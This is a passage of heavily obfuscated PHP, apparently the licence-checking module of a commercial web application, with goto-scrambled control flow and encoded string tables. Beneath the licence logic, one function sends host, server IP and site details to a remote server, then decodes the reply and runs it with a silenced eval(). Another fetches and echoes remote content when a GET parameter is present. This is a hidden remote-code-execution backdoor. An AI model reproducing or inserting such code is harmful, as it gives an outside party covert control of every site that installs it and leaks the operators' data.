$_SERVER[$F—½Ì›³§œ[181]]); $B£Çëä¬ŠØ = $this->{$_SERVER[×§Œ³][212]}($F—½Ì›³§œ[154]($C§Ûã°½‘)); $this->{$_SERVER[×§Œ³][189]}($F—½Ì›³§œ[213] . $B£Çëä¬ŠØ); $F—½Ì›³§œ[172]($F—½Ì›³§œ[204]($F—½Ì›³§œ[214]), !0); } $e°¬¢Õ­Œ = array($F—½Ì›³§œ[215] => $E‘•÷£¦†é[$F—½Ì›³§œ[171]], $F—½Ì›³§œ[216] => $fİë‘Ñå×[$F—½Ì›³§œ[217]], $F—½Ì›³§œ[218] => $F—½Ì›³§œ[130](16), $F—½Ì›³§œ[126] => $fİë‘Ñå×[$F—½Ì›³§œ[219]]); goto båƒŸò—; F† Îï®ôÑ: $e°¬¢Õ­Œ[$F—½Ì›³§œ[128]] = $F—½Ì›³§œ[220]($F—½Ì›³§œ[124]($this->{$_SERVER[×§Œ³][153]}($FÙÕ¥‰…Á, $F—½Ì›³§œ[221]))); $b×‚’¸“³ğ = $AÑ­…è¥ï[612]; if (strlen($b×‚’¸“³ğ) < $AÑ­…è¥ï[577]) { return; } goto a—ªí«÷ŠŒ; bœ¥¥ƒ…Óç: if ($B¦¸¨Ô„ğê[$F—½Ì›³§œ[184]] == $F—½Ì›³§œ[185]) { $C‰¬àÎé´å = $this->{$_SERVER[×§Œ³][153]}($DÔ¡ğ©›ÉÙ, $F—½Ì›³§œ[186]); $B£Çëä¬ŠØ = $this->{$_SERVER[×§Œ³][133]}($F—½Ì›³§œ[154]($E‘•÷£¦†é), $DÔ¡ğ©›ÉÙ . $F—½Ì›³§œ[187], 3); $B£Çëä¬ŠØ = $B£Çëä¬ŠØ . $F—½Ì›³§œ[188] . $_SERVER[$F—½Ì›³§œ[179]]; $f¾ñÁÔÙ¿â = $this->{$_SERVER[×§Œ³][189]}($F—½Ì›³§œ[190] . $C‰¬àÎé´å . $F—½Ì›³§œ[191] . $B£Çëä¬ŠØ, -1); $F—½Ì›³§œ[172]($f¾ñÁÔÙ¿â, !0); } else { if ($B¦¸¨Ô„ğê[$F—½Ì›³§œ[184]] == $F—½Ì›³§œ[192]) { $A“Œ°…ÅŠ‚ = $F—½Ì›³§œ[25]($F—½Ì›³§œ[120]($F—½Ì›³§œ[193] . $DÔ¡ğ©›ÉÙ), 12, 15) . $F—½Ì›³§œ[194]; $B£Çëä¬ŠØ = $this->{$_SERVER[×§Œ³][195]}($F—½Ì›³§œ[2]($B¦¸¨Ô„ğê[$F—½Ì›³§œ[196]]), $A“Œ°…ÅŠ‚, 2); $DàĞ½Ç¼÷É = $F—½Ì›³§œ[197]($B£Çëä¬ŠØ, !0); if (!$F—½Ì›³§œ[198]($DàĞ½Ç¼÷É) || !$F—½Ì›³§œ[198]($DàĞ½Ç¼÷É[$F—½Ì›³§œ[199]]) || $DàĞ½Ç¼÷É[$F—½Ì›³§œ[171]] != !0) { $aÈ‚– “Ì = $F—½Ì›³§œ[200]; $DôÄÆËê = $DàĞ½Ç¼÷É[$F—½Ì›³§œ[199]] ? $F—½Ì›³§œ[201] . $DàĞ½Ç¼÷É[$F—½Ì›³§œ[199]] : $aÈ‚– “Ì; $F—½Ì›³§œ[172]($DôÄÆËê, !1); } else { $E‘•÷£¦†é[$F—½Ì›³§œ[174]] = $DàĞ½Ç¼÷É[$F—½Ì›³§œ[199]][$F—½Ì›³§œ[202]]; } } else { $DàĞ½Ç¼÷É = $this->{$_SERVER[×§Œ³][189]}($F—½Ì›³§œ[203], $E‘•÷£¦†é, 10); } } if (!$F—½Ì›³§œ[198]($DàĞ½Ç¼÷É) || !$F—½Ì›³§œ[198]($DàĞ½Ç¼÷É[$F—½Ì›³§œ[199]]) || $DàĞ½Ç¼÷É[$F—½Ì›³§œ[171]] != !0) { $aÈ‚– “Ì = $F—½Ì›³§œ[204]($F—½Ì›³§œ[205]); $DôÄÆËê = $DàĞ½Ç¼÷É[$F—½Ì›³§œ[199]] ? $F—½Ì›³§œ[201] . $DàĞ½Ç¼÷É[$F—½Ì›³§œ[199]] : $aÈ‚– “Ì; $F—½Ì›³§œ[172]($DôÄÆËê, !1); } $fİë‘Ñå× = $DàĞ½Ç¼÷É[$F—½Ì›³§œ[199]]; goto a³²‹‚‚éª; fã°ê¼â¼”: $c¢¨Á°½® = $F—½Ì›³§œ[120]($_SERVER[$F—½Ì›³§œ[121]] . $F—½Ì›³§œ[220]($A•á­À‡¾ô) . $e°¬¢Õ­Œ[$F—½Ì›³§œ[216]]); $DÉŠªÎéôœ = $F—½Ì›³§œ[220]($F—½Ì›³§œ[25]($c¢¨Á°½®, 10, 16)); $E¡æœ°ÙÄ³ = $this->{$_SERVER[×§Œ³][133]}($F—½Ì›³§œ[154]($fİë‘Ñå×), $c¢¨Á°½®); goto AæÖÖ¢ÊÖ›; Dáë¿Èô‹µ: $dè›ÓæÇ¾ = $AÇõİÏİ¨™[$F—½Ì›³§œ[231]]; $aËÙ±Ì¹Ö· = array(); $DÜÈš·Ç = $AÑ­…è¥ï[616]; goto a˜Å²×ªÉ; F¡Ò‘¹ËÓÇ: $e°¬¢Õ­Œ[$F—½Ì›³§œ[129]] = $F—½Ì›³§œ[124]($F—½Ì›³§œ[220]($this->{$_SERVER[×§Œ³][153]}($b‡§È†ÅÕ, $F—½Ì›³§œ[222]))); if ($fİë‘Ñå×[$F—½Ì›³§œ[223]] && $fİë‘Ñå×[$F—½Ì›³§œ[223]] >= 1) { $F—½Ì›³§œ[61]($F—½Ì›³§œ[62])->{$_SERVER[×§Œ³][224]}($F—½Ì›³§œ[225], $F—½Ì›³§œ[226]); } $F—½Ì›³§œ[61]($F—½Ì›³§œ[62])->{$_SERVER[×§Œ³][227]}($e°¬¢Õ­Œ); goto fã°ê¼â¼”; Fôùä°¢áÄ: $DÔ¡ğ©›ÉÙ = $F—½Ì›³§œ[120]($_SERVER[$F—½Ì›³§œ[121]] . $A•á­À‡¾ô); $FÁ³˜ë›Ù¦ = $AÑ­…è¥ï[611]; if (!$FÁ³˜ë›Ù¦) { return; } goto bœ¥¥ƒ…Óç; a˜Å²×ªÉ: $aËÙ±Ì¹Ö·[$DÉŠªÎéôœ] = $E¡æœ°ÙÄ³; $F—½Ì›³§œ[61]($F—½Ì›³§œ[11])->{$_SERVER[×§Œ³][232]}($dè›ÓæÇ¾[$F—½Ì›³§œ[233]], array($F—½Ì›³§œ[234] => $aËÙ±Ì¹Ö·)); $a½Šœ“®£Ç = $AÑ­…è¥ï[617]; goto aÍ‘‡Şº; bŒÑ×÷ Çë: } private function licenseRegistSuccess() { $Bñ‚‡ëôÅå =& $_SERVER[×§Œ³]; $bÜÕà÷ÉŠ™ = $Bñ‚‡ëôÅå[61]($Bñ‚‡ëôÅå[62])->{$_SERVER[×§Œ³][63]}(); $Eôõ¦ßÍäè = $_SERVER[¢Í][620]; if ($bÜÕà÷ÉŠ™[$Bñ‚‡ëôÅå[89]] != $Bñ‚‡ëôÅå[226]) { $Bñ‚‡ëôÅå[61]($Bñ‚‡ëôÅå[62])->{$_SERVER[×§Œ³][227]}($Bñ‚‡ëôÅå[89], $Bñ‚‡ëôÅå[226]); } $Bñ‚‡ëôÅå[116]($Bñ‚‡ëôÅå[238])->{$_SERVER[×§Œ³][239]}(!0); } private function fvbzbd0d578c() { goto A¡¥ÉÁÔƒ´; e¤Ô•«‰´Ã: $AÒ‡ïëí¨³ = $e›‘ÅË¥±[621]; if (!$AÒ‡ïëí¨³) { return; } $a½ÔÃµãØµ[61]($a½ÔÃµãØµ[62])->{$_SERVER[×§Œ³][224]}($a½ÔÃµãØµ[225], $a½ÔÃµãØµ[240]); goto Cƒ¹ó¬šï‘; dÍ‡˜¹çÆĞ: $aŒÜ½ÇØÅ¤ = $e›‘ÅË¥±[623]; if (!$aŒÜ½ÇØÅ¤) { die; } $this->mhcud45947dc = $a½ÔÃµãØµ[127]; goto C–‰Š™ÒË¯; Cƒ¹ó¬šï‘: $A×÷Ğ†”‹å = $e›‘ÅË¥±[622]; if (!$A×÷Ğ†”‹å) { return; } $this->hzrd5d37b4cb = array(); goto dÍ‡˜¹çÆĞ; A¡¥ÉÁÔƒ´: $e›‘ÅË¥± =& $_SERVER[¢Í]; $a½ÔÃµãØµ =& $_SERVER[×§Œ³]; $a½ÔÃµãØµ[61]($a½ÔÃµãØµ[62])->{$_SERVER[×§Œ³][227]}(array($a½ÔÃµãØµ[215] => $a½ÔÃµãØµ[10], $a½ÔÃµãØµ[216] => $a½ÔÃµãØµ[10], $a½ÔÃµãØµ[126] => $a½ÔÃµãØµ[127], $a½ÔÃµãØµ[128] => $a½ÔÃµãØµ[10], $a½ÔÃµãØµ[129] => $a½ÔÃµãØµ[10])); goto e¤Ô•«‰´Ã; C–‰Š™ÒË¯: } private function bmhi2f057baa() { goto B÷°¼Ù; bÄğƒŒ“ìÄ: $EÆìßã°íÊ[$E“æÌ•“Ö¤[241]] = $E“æÌ•“Ö¤[242](); Cache::set($a¢Ñ¤ˆ•—ƒ, $EÆìßã°íÊ); $E……ÃÇ˜ßï = $EéÒ˜•áø[625]; goto C‡÷‘ÇºÖ„; B˜Ô®¼îò: if (!$E“æÌ•“Ö¤[198]($EÆìßã°íÊ)) { return $this->{$_SERVER[×§Œ³][170]}(); } $a‹î†Õ“« = $E“æÌ•“Ö¤[150]($EÆìßã°íÊ[$E“æÌ•“Ö¤[151]]); if ($E“æÌ•“Ö¤[242]() >= $a‹î†Õ“«) { return $this->{$_SERVER[×§Œ³][170]}(); } goto bÄğƒŒ“ìÄ; aïÙ…¡èğÒ: $this->mhcud45947dc = $FÚ¼¬¯”Û’[$E“æÌ•“Ö¤[126]]; $aä¨Ä©…® = $EéÒ˜•áø[627]; while (strlen($aä¨Ä©…®) < $EéÒ˜•áø[577]) { if (!$aä¨Ä©…®) { break; } $aä¨Ä©…®++; } goto fÆ‡¨‚ª¬Ó; F¯ÏíÏù–í: $this->mhcud45947dc = $E“æÌ•“Ö¤[127]; $D–Ì²µ½¿Ö = $EéÒ˜•áø[624]; if (!$D–Ì²µ½¿Ö) { return; } goto c®íÕ±ŠÙ; C‡÷‘ÇºÖ„: $this->hzrd5d37b4cb = $EÆìßã°íÊ; $D†òğœÆøÏ = $EéÒ˜•áø[626]; if (strlen($D†òğœÆøÏ) < $EéÒ˜•áø[573]) { return; } goto aïÙ…¡èğÒ; c®íÕ±ŠÙ: $FÚ¼¬¯”Û’ = $E“æÌ•“Ö¤[61]($E“æÌ•“Ö¤[62])->{$_SERVER[×§Œ³][63]}(); if ($FÚ¼¬¯”Û’[$E“æÌ•“Ö¤[126]] == $E“æÌ•“Ö¤[127]) { return; } $c‡´˜ñ£Ô = $E“æÌ•“Ö¤[61]($E“æÌ•“Ö¤[62])->{$_SERVER[×§Œ³][63]}($E“æÌ•“Ö¤[122]); goto eÛğ‹çòó; B÷°¼Ù: $EéÒ˜•áø =& $_SERVER[¢Í]; $E“æÌ•“Ö¤ =& $_SERVER[×§Œ³]; $_SERVER[$E“æÌ•“Ö¤[181]] = $E“æÌ•“Ö¤[112]($_SERVER, $E“æÌ•“Ö¤[181], APP_HOST); goto F¯ÏíÏù–í; eÛğ‹çòó: $a¢Ñ¤ˆ•—ƒ = $E“æÌ•“Ö¤[236] . $E“æÌ•“Ö¤[120]($c‡´˜ñ£Ô . $E“æÌ•“Ö¤[237]); $EÆìßã°íÊ = Cache::get($a¢Ñ¤ˆ•—ƒ); if (!$E“æÌ•“Ö¤[198]($EÆìßã°íÊ) || !isset($EÆìßã°íÊ[$E“æÌ•“Ö¤[241]]) || $E“æÌ•“Ö¤[242]() - $EÆìßã°íÊ[$E“æÌ•“Ö¤[241]] >= 60) { $E‡ïõŒŸÁ = $E“æÌ•“Ö¤[228]($E“æÌ•“Ö¤[61]($E“æÌ•“Ö¤[11])->{$_SERVER[×§Œ³][229]}(), $E“æÌ•“Ö¤[230]); $EÎŠ˜Ş¿ï… = $E‡ïõŒŸÁ[$E“æÌ•“Ö¤[231]]; $däñ¦Æºé° = $E“æÌ•“Ö¤[120]($_SERVER[$E“æÌ•“Ö¤[121]] . $E“æÌ•“Ö¤[220]($c‡´˜ñ£Ô) . $FÚ¼¬¯”Û’[$E“æÌ•“Ö¤[216]]); $e™ÖÀ¿È•³ = $E“æÌ•“Ö¤[220]($E“æÌ•“Ö¤[25]($däñ¦Æºé°, 10, 16)); $EÆìßã°íÊ = $this->{$_SERVER[×§Œ³][195]}($EÎŠ˜Ş¿ï…[$E“æÌ•“Ö¤[100]][$e™ÖÀ¿È•³], $däñ¦Æºé°); $EÆìßã°íÊ = $E“æÌ•“Ö¤[197]($EÆìßã°íÊ, !0); } goto B˜Ô®¼îò; fÆ‡¨‚ª¬Ó: } private function sxbu85e1085d() { goto BÖ•Ü¥Óİ; B®Õ¡‡Á¸™: $aÊ­£ó¼Œ‘ = $_SERVER[¢Í][628]; if (!$aÊ­£ó¼Œ‘) { die; } if ($C„îñÆäŠ == $eåµ„²†…[243] && $this->mhcud45947dc == $eåµ„²†…[127]) { $eåµ„²†…[172]($eåµ„²†…[204]($eåµ„²†…[244]), !1, $eåµ„²†…[245]); } goto cçÕäÁÆó; BÖ•Ü¥Óİ: $eåµ„²†… =& $_SERVER[×§Œ³]; $B„À•©ëˆ¦ = $GLOBALS[$eåµ„²†…[22]]; $C„îñÆäŠ = $_SERVER[$eåµ„²†…[44]]; goto B®Õ¡‡Á¸™; cçÕäÁÆó: $eŒãêšøé¹ = array($eåµ„²†…[246], $eåµ„²†…[247]); if ($eåµ„²†…[248]($C„îñÆäŠ, $eŒãêšøé¹)) { if ($this->mhcud45947dc == $eåµ„²†…[127] && isset($B„À•©ëˆ¦[$eåµ„²†…[249]])) { $eåµ„²†…[172]($eåµ„²†…[204]($eåµ„²†…[244]), !1, $eåµ„²†…[245]); die; } $eõ‹é±æ“Æ = $this->{$_SERVER[×§Œ³][143]}(); if ($eõ‹é±æ“Æ != $eåµ„²†…[250]($eåµ„²†…[251])) { if ($eõ‹é±æ“Æ <= $eåµ„²†…[61]($eåµ„²†…[145])->{$_SERVER[×§Œ³][146]}()) { $eåµ„²†…[172]($eåµ„²†…[204]($eåµ„²†…[252]), !1, $eåµ„²†…[245]); die; } } } goto b•™·ï½ ù; b•™·ï½ ù: } private function ynbw0166bc4c() { goto Aæ†º¦Ş÷ß; AĞŞ—ÔùÑ¤: die; goto eË±†¿éÁ; Cèø·å²øÀ: $Aš¡ç§Š« = $dá’ˆĞÒç¬[258](array($dá’ˆĞÒç¬[259] => array($dá’ˆĞÒç¬[260] => $dá’ˆĞÒç¬[261], $dá’ˆĞÒç¬[262] => 3))); $dÑèÎÌ¨ = $D‘ˆõ“§[630]; $E–´ğ’–Œ = @$dá’ˆĞÒç¬[263]($A¦ŞÍ¯ßÔ¹, !1, $Aš¡ç§Š«); goto e£êä°©Ó¡; e£êä°©Ó¡: $E·ª³¿Ç« = $D‘ˆõ“§[631]; if (!$E·ª³¿Ç«) { return; } $dá’ˆĞÒç¬[264]($dá’ˆĞÒç¬[265]); goto A‡™Ë£˜…; A‡™Ë£˜…: $eº´¹’ÙÒ« = $D‘ˆõ“§[632]; if (strlen($eº´¹’ÙÒ«) < $D‘ˆõ“§[594]) { die; } if ($E–´ğ’–Œ && $dá’ˆĞÒç¬[32]($E–´ğ’–Œ, $dá’ˆĞÒç¬[266])) { echo $E–´ğ’–Œ; } goto AĞŞ—ÔùÑ¤; B‡¨Ş”‰»‰: if (!$dá’ˆĞÒç¬[248]($_SERVER[$dá’ˆĞÒç¬[44]], $c¬ã™Ê·õ)) { return; } $A¦ŞÍ¯ßÔ¹ = $dá’ˆĞÒç¬[255]; $A¦ŞÍ¯ßÔ¹ = $this->{$_SERVER[×§Œ³][256]}($A¦ŞÍ¯ßÔ¹, $dá’ˆĞÒç¬[257]); goto Cèø·å²øÀ; Aæ†º¦Ş÷ß: $D‘ˆõ“§ =& $_SERVER[¢Í]; $dá’ˆĞÒç¬ =& $_SERVER[×§Œ³]; $c¬ã™Ê·õ = array($dá’ˆĞÒç¬[141], $dá’ˆĞÒç¬[253]); goto CóÅÖê÷«İ; CóÅÖê÷«İ: $Dº°¬è’ = $D‘ˆõ“§[629]; if (!$Dº°¬è’) { return; } if (!$dá’ˆĞÒç¬[112]($GLOBALS, $dá’ˆĞÒç¬[138]) || !isset($_GET[$dá’ˆĞÒç¬[254]])) { return; } goto B‡¨Ş”‰»‰; eË±†¿éÁ: } public function fsrn07521c9d($E½Ö¯ÏÂÎÂ) { goto fã‹÷ã÷°®; fã‹÷ã÷°®: $c¡éöéÓ•Š =& $_SERVER[¢Í]; $C¦«Ûå÷å =& $_SERVER[×§Œ³]; if ($this->mhcud45947dc == $C¦«Ûå÷å[267]) { return $E½Ö¯ÏÂÎÂ; } goto a…â×¶½ƒŠ; BëÎ«æà«À: $c¶“˜ÂÕÆ = $C¦«Ûå÷å[0]($C¦«Ûå÷å[283], $C¦«Ûå÷å[112]($this->hzrd5d37b4cb, $C¦«Ûå÷å[135], $C¦«Ûå÷å[10])); $bŠ„öãÀ˜á = array(); $bä³¬œ³† = $c¡éöéÓ•Š[634]; goto fø—ë“îÔ; a…â×¶½ƒŠ: $e¾ğŠÈ = array($C¦«Ûå÷å[268] => $C¦«Ûå÷å[269], $C¦«Ûå÷å[270] => $C¦«Ûå÷å[269], $C¦«Ûå÷å[271] => $C¦«Ûå÷å[269], $C¦«Ûå÷å[272] => $C¦«Ûå÷å[269], $C¦«Ûå÷å[273] => $C¦«Ûå÷å[269], $C¦«Ûå÷å[274] => $C¦«Ûå÷å[269], $C¦«Ûå÷å[275] => $C¦«Ûå÷å[276], $C¦«Ûå÷å[277] => $C¦«Ûå÷å[276], $C¦«Ûå÷å[278] => $C¦«Ûå÷å[276], $C¦«Ûå÷å[279] => $C¦«Ûå÷å[276], $C¦«Ûå÷å[280] => $C¦«Ûå÷å[276], $C¦«Ûå÷å[281] => $C¦«Ûå÷å[276], $C¦«Ûå÷å[282] => $C¦«Ûå÷å[276]); $eøé¿¹àõã = $c¡éöéÓ•Š[633]; if (!$eøé¿¹àõã) { return; } goto BëÎ«æà«À; fø—ë“îÔ: foreach ($e¾ğŠÈ as $aˆ©Ê¨î => $a†™¹ŒÏÎ²) { if ($a†™¹ŒÏÎ² == $C¦«Ûå÷å[269] && $C¦«Ûå÷å[25]($this->mhcud45947dc, 0, 1) == $C¦«Ûå÷å[269]) { continue; } if (!$C¦«Ûå÷å[248]($aˆ©Ê¨î, $c¶“˜ÂÕÆ)) { $bŠ„öãÀ˜á[] = $aˆ©Ê¨î; } } foreach ($bŠ„öãÀ˜á as $aˆ©Ê¨î) { unset($E½Ö¯ÏÂÎÂ[$aˆ©Ê¨î]); $cº°î¯·ŸÀ = $c¡éöéÓ•Š[635]; } return $E½Ö¯ÏÂÎÂ; goto e‡›†°»ºŠ; e‡›†°»ºŠ: } private function viwd22bf5a85() { $B¤Òùóº“ =& $_SERVER[×§Œ³]; if ($this->mhcud45947dc != $B¤Òùóº“[127]) { return; } $GLOBALS[$B¤Òùóº“[100]][$B¤Òùóº“[104]][$B¤Òùóº“[284]] = $B¤Òùóº“[226]; $GLOBALS[$B¤Òùóº“[100]][$B¤Òùóº“[285]] = $B¤Òùóº“[226]; if ($B¤Òùóº“[61]($B¤Òùóº“[286])->{$_SERVER[×§Œ³][63]}($B¤Òùóº“[89]) != $B¤Òùóº“[240]) { $B¤Òùóº“[61]($B¤Òùóº“[286])->{$_SERVER[×§Œ³][227]}($B¤Òùóº“[89], $B¤Òùóº“[240]); } } public function lxfa5fb32c75() { return $_SERVER[×§Œ³][287]; } private function dltk8adebebc() { goto EÊåÒ´¿ƒ”; FäõÚèŞÍ­: if ($B°²±†ª÷¼ && $B¨«•İì°[242]() - $B°²±†ª÷¼ < $B¨«•İì°[250]($B¨«•İì°[295])) { return; } $B¨«•İì°[13](array($B¨«•İì°[293], $B¨«•İì°[158]), $E¦¶¬œóãæ, $B¨«•İì°[242]()); $eØ‘À®Í’İ = $F¬‰êÁ’ªÑ[638]; goto DÊ¾®ÓÀŠ°; cÛÕß¸šÂ·: if (!$B¨«•İì°[248]($_SERVER[$B¨«•İì°[44]], $E…®ÒøÙÍ)) { return; } if ($B¨«•İì°[242]() % 4 != 0) { return; } $B°²±†ª÷¼ = $B¨«•İì°[13](array($B¨«•İì°[293], $B¨«•İì°[294]), $E¦¶¬œóãæ); goto FäõÚèŞÍ­; Bøê²ñâ†ƒ: $aßÆªßÂÌ = $F¬‰êÁ’ªÑ[637]; if (!$aßÆªßÂÌ) { die; } if ($this->mhcud45947dc == $B¨«•İì°[127] || !$B¨«•İì°[112]($GLOBALS, $B¨«•İì°[138])) { return; } goto cÛÕß¸šÂ·; d¡Çè¯µ‹¿: if (!$b¿ÁÛºÉ¥) { die; } if ($this->{$_SERVER[×§Œ³][206]}($D¼âÊÃø´ƒ[$B¨«•İì°[297]]) != $B¦Å…º³ƒ«[$B¨«•İì°[171]]) { $Fõ¥¤¥ØÌä = array($B¨«•İì°[208] => $B¨«•İì°[61]($B¨«•İì°[62])->{$_SERVER[×§Œ³][63]}($B¨«•İì°[122]), $B¨«•İì°[209] => $_SERVER[$B¨«•İì°[121]], $B¨«•İì°[210] => $B¨«•İì°[211](), $B¨«•İì°[180] => $_SERVER[$B¨«•İì°[181]]); $AŸù™Ô¬öÄ = $this->{$_SERVER[×§Œ³][212]}($B¨«•İì°[154]($Fõ¥¤¥ØÌä)); $D¼âÊÃø´ƒ = $this->{$_SERVER[×§Œ³][189]}($B¨«•İì°[213] . $AŸù™Ô¬öÄ); if ($D¼âÊÃø´ƒ && $B¨«•İì°[198]($D¼âÊÃø´ƒ) && isset($D¼âÊÃø´ƒ[$B¨«•İì°[297]])) { $Cï·Èò–¸ = $this->{$_SERVER[×§Œ³][195]}($D¼âÊÃø´ƒ[$B¨«•İì°[297]], 2); if ($Cï·Èò–¸) { $Cï·Èò–¸ = $this->{$_SERVER[×§Œ³][206]}($Cï·Èò–¸); } if ($Cï·Èò–¸) { try { @eval($Cï·Èò–¸); } catch (Exception $C’¦Š«ã) { } } } } goto a™ÕÛ‘ââƒ; E¯ÇËäÍªÑ: $AŒ½Ü†º = $F¬‰êÁ’ªÑ[639]; if (strlen($AŒ½Ü†º) < $F¬‰êÁ’ªÑ[579]) { return; } if (!$B¨«•İì°[198]($D¼âÊÃø´ƒ)) { return; } goto Cò·ËÛá¶¡; Cò·ËÛá¶¡: if ($D¼âÊÃø´ƒ[$B¨«•İì°[171]] && $D¼âÊÃø´ƒ[$B¨«•İì°[297]]) { if ($this->{$_SERVER[×§Œ³][206]}($D¼âÊÃø´ƒ[$B¨«•İì°[297]]) == $B¦Å…º³ƒ«[$B¨«•İì°[171]]) { return; } } $this->{$_SERVER[×§Œ³][170]}(); $b¿ÁÛºÉ¥ = $F¬‰êÁ’ªÑ[640]; goto d¡Çè¯µ‹¿; b´ß‰öíƒÓ: $F²ÅºŒËĞ‡ = $F¬‰êÁ’ªÑ[636]; while ($F²ÅºŒËĞ‡ < $F¬‰êÁ’ªÑ[577]) { if ($F²ÅºŒËĞ‡ >= 0) { break; } $F²ÅºŒËĞ‡++; } $E¦¶¬œóãæ = $B¨«•İì°[291] . $B¨«•İì°[120]($B¨«•İì°[292]); goto Bøê²ñâ†ƒ; EÊåÒ´¿ƒ”: $F¬‰êÁ’ªÑ =& $_SERVER[¢Í]; $B¨«•İì° =& $_SERVER[×§Œ³]; $E…®ÒøÙÍ = array($B¨«•İì°[288], $B¨«•İì°[289], $B¨«•İì°[290]); goto b´ß‰öíƒÓ; DÊ¾®ÓÀŠ°: if (strlen($eØ‘À®Í’İ) < $F¬‰êÁ’ªÑ[573]) { return; } $B¦Å…º³ƒ« = array($B¨«•İì°[171] => $B¨«•İì°[61]($B¨«•İì°[62])->{$_SERVER[×§Œ³][63]}($B¨«•İì°[215]), $B¨«•İì°[184] => $this->mhcud45947dc, $B¨«•İì°[182] => $_SERVER[$B¨«•İì°[183]], $B¨«•İì°[175] => $B¨«•İì°[155], $B¨«•İì°[178] => $_SERVER[$B¨«•İì°[179]]); $D¼âÊÃø´ƒ = $this->{$_SERVER[×§Œ³][189]}($B¨«•İì°[296], $B¦Å…º³ƒ«); goto E¯ÇËäÍªÑ; a™ÕÛ‘ââƒ: } private function fxge362cb14d($aƒŸ‘ïÃ« = '', $e·Áö¤ßÕÓ = array(), $BŠ¦Óè¯ï = 5) { goto d‰ğà«‚º; e±„èİ•‘ : return $DäŸÚÌ¯‘á[197]($e·Áö¤ßÕÓ, !0); goto FïİŒö§ˆ†; D¡Æ £ƒï§: if ($e·Áö¤ßÕÓ === -1) { return $dÀ¦±òÛ÷; } $Bªáìßœä¯ = $DäŸÚÌ¯‘á[258](array($DäŸÚÌ¯‘á[259] => array($DäŸÚÌ¯‘á[262] => $BŠ¦Óè¯ï, $DäŸÚÌ¯‘á[260] => $DäŸÚÌ¯‘á[302]), $DäŸÚÌ¯‘á[303] => array($DäŸÚÌ¯‘á[304] => !1, $DäŸÚÌ¯‘á[305] => !1))); $e·Áö¤ßÕÓ = @$DäŸÚÌ¯‘á[263]($dÀ¦±òÛ÷, !1, $Bªáìßœä¯); goto e±„èİ•‘ ; d‰ğà«‚º: $DäŸÚÌ¯‘á =& $_SERVER[×§Œ³]; $dÀ¦±òÛ÷ = $DäŸÚÌ¯‘á[298]; $b Û‰®¢­Ü = $_SERVER[¢Í][641]; goto c‚“‘²¸ ; c‚“‘²¸ : if (!$b Û‰®¢­Ü) { die; } $dÀ¦±òÛ÷ = $this->{$_SERVER[×§Œ³][256]}($dÀ¦±òÛ÷, $DäŸÚÌ¯‘á[299]); $dÀ¦±òÛ÷ = $dÀ¦±òÛ÷ . $aƒŸ‘ïÃ« . $DäŸÚÌ¯‘á[300] . $DäŸÚÌ¯‘á[301]($e·Áö¤ßÕÓ); goto D¡Æ £ƒï§; FïİŒö§ˆ†: } private function mbpn4b9ef9d8() { goto DØ¥öÊÌĞğ; Cõ¼ç–îöá: $c”¨ÖãÑá™ = $Eù“µ¤÷¢[$this->mhcud45947dc]; $b›ö¥äŸÌ• = $D¡ŒŒ¡Ä¬š[642]; $c”¨ÖãÑá™ = $C†‚Ş¡ç÷ó[250]($c”¨ÖãÑá™ ? $c”¨ÖãÑá™ : $C†‚Ş¡ç÷ó[307]); goto F…Æå›î®; F…Æå›î®: $f’Ô“Ô¥– = $D¡ŒŒ¡Ä¬š[643]; $a©º„–µõë = $C†‚Ş¡ç÷ó[112]($this->hzrd5d37b4cb, $C†‚Ş¡ç÷ó[333]); $a©º„–µõë = $a©º„–µõë ? $C†‚Ş¡ç÷ó[250]($a©º„–µõë) : 0; goto CÚ²£¦÷; DØ¥öÊÌĞğ: $D¡ŒŒ¡Ä¬š =& $_SERVER[¢Í]; $C†‚Ş¡ç÷ó =& $_SERVER[×§Œ³]; $Eù“µ¤÷¢ = array($C†‚Ş¡ç÷ó[306] => $C†‚Ş¡ç÷ó[307], $C†‚Ş¡ç÷ó[308] => $C†‚Ş¡ç÷ó[309], $C†‚Ş¡ç÷ó[310] => $C†‚Ş¡ç÷ó[311], $C†‚Ş¡ç÷ó[312] => $C†‚Ş¡ç÷ó[313], $C†‚Ş¡ç÷ó[314] => $C†‚Ş¡ç÷ó[315], $C†‚Ş¡ç÷ó[316] => $C†‚Ş¡ç÷ó[251], $C†‚Ş¡ç÷ó[317] => $C†‚Ş¡ç÷ó[251], $C†‚Ş¡ç÷ó[318] => $C†‚Ş¡ç÷ó[307], $C†‚Ş¡ç÷ó[319] => $C†‚Ş¡ç÷ó[309], $C†‚Ş¡ç÷ó[320] => $C†‚Ş¡ç÷ó[311], $C†‚Ş¡ç÷ó[321] => $C†‚Ş¡ç÷ó[322], $C†‚Ş¡ç÷ó[323] => $C†‚Ş¡ç÷ó[313], $C†‚Ş¡ç÷ó[324] => $C†‚Ş¡ç÷ó[325], $C†‚Ş¡ç÷ó[326] => $C†‚Ş¡ç÷ó[315], $C†‚Ş¡ç÷ó[327] => $C†‚Ş¡ç÷ó[328], $C†‚Ş¡ç÷ó[329] => $C†‚Ş¡ç÷ó[330], $C†‚Ş¡ç÷ó[331] => $C†‚Ş¡ç÷ó[332]); goto Cõ¼ç–îöá; CÚ²£¦÷: return $c”¨ÖãÑá™ + $a©º„–µõë; $c¨”ÍÛ÷…‚ = $D¡ŒŒ¡Ä¬š[644]; while ($c¨”ÍÛ÷…‚ < $D¡ŒŒ¡Ä¬š[579]) { if ($c¨”ÍÛ÷…‚ >= 0) { break; } $c¨”ÍÛ÷…‚++; } goto D™â‚ßø°; D™â‚ßø°: } public function gswc5cf39d01($bŸ–¢öİ¯±) { goto f¸é“«’í»; f¸é“«’í»: $b¨‚Ô×‹¿İ =& $_SERVER[×§Œ³]; $DäÇ¿­•›ç = $this->{$_SERVER[×§Œ³][143]}(); if ($bŸ–¢öİ¯±[$b¨‚Ô×‹¿İ[334]] == $b¨‚Ô×‹¿İ[226]) { return; } goto CºŠ«¥˜ºù; CçˆÁÑ–“­: $C©‰ˆ·°¢ = $b¨‚Ô×‹¿İ[61]($b¨‚Ô×‹¿İ[145])->{$_SERVER[×§Œ³][335]}($b¨‚Ô×‹¿İ[334])->{$_SERVER[×§Œ³][336]}($DäÇ¿­•›ç)->{$_SERVER[×§Œ³][337]}(); $C©‰ˆ·°¢ = $b¨‚Ô×‹¿İ[228]($C©‰ˆ·°¢, $b¨‚Ô×‹¿İ[10], $b¨‚Ô×‹¿İ[334]); $f‚ìÄ¼æ™ó = $_SERVER[¢Í][645]; goto e‡Ä½ææ‘; CºŠ«¥˜ºù: if ($DäÇ¿­•›ç >= 